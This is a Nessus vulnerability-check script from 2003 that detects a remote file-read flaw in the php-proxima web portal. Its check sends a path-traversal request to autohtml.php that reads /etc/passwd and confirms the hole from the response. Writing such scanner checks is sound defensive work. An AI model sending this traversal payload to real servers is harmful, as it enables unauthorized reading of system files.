#
# (C) Tenable Network Security
#
#
# Ref:
#  From: "Mind Warper" <mindwarper@linuxmail.org>
#  To: bugtraq@securityfocus.com
#  Date: Thu, 15 May 2003 01:43:40 +0800
#  Subject: php-proxima Remote File Access Vulnerability


if (description)
{
 script_id(11630);
 script_version ("$Revision: 1.6 $");

 script_name(english:"php-proxima file reading");
 desc["english"] = "
The remote host is running php-proxima, a website portal.

There is a flaw in this version which allows an attacker to read
arbitrary files on the remote host.

Solution : None at this time - disable this CGI
Risk factor : High";


 script_description(english:desc["english"]);
 script_summary(english:"Determines owl is installed");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


foreach d (cgi_dirs())
{
 req = http_get(item:d + "/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:res))
 	{
    	security_hole(port);
	exit(0);
	}
}
